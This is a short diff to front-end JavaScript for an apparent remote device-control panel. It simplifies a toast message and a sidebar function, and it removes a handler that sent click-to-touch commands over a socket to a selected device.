-  showToast('📤 ' + icon + ' ' + action, 'info');
+  showToast('📤 ' + icon, 'info');
 }
 
 function showSection(name) {
-  if (name === 'devices') {
-    document.getElementById('sidebar').classList.remove('open');
-  }
+  document.getElementById('sidebar').classList.remove('open');
 }
-
-document.addEventListener('click', function(e) {
-  if (e.target.id === 'screenWrapper' || e.target.id === 'screenImg') {
-    if (!screenActive || !selectedDevice) return;
-    const img = document.getElementById('screenImg');
-    const rect = img.getBoundingClientRect();
-    const x = (e.clientX - rect.left) / rect.width;
-    const y = (e.clientY - rect.top) / rect.height;
-    if (x < 0 || x > 1 || y < 0 || y > 1) return;
-    socket.emit('send_command', {
-      target: selectedDevice,
-      action: 'touch',
-      params: { x: x, y: y, relative: true }
-    });
-    showToast('👆 لمسة', 'info');
-  }
-});
 
 function showImage(src) {
   const v = document.createElement('div');
